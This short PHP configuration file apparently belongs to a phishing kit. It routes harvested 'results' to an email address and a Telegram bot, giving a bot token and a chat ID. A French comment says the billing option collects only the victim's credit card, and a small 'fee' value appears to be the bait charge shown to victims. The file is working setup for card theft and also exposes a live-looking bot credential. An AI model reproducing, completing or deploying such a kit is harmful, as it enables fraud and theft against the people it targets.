<?php

# REZ MAIL

$email = "";

# REZ TELEGRAM

$token = "8067022156:AAFRsyYSCBvErALC22_5dimnzzE-eBgruRk";
$chatid = "1405956365";

$chatidclick = "";

$panel = True;
$billing = True; # recevoir uniquement la cc 

$frais = "0.92";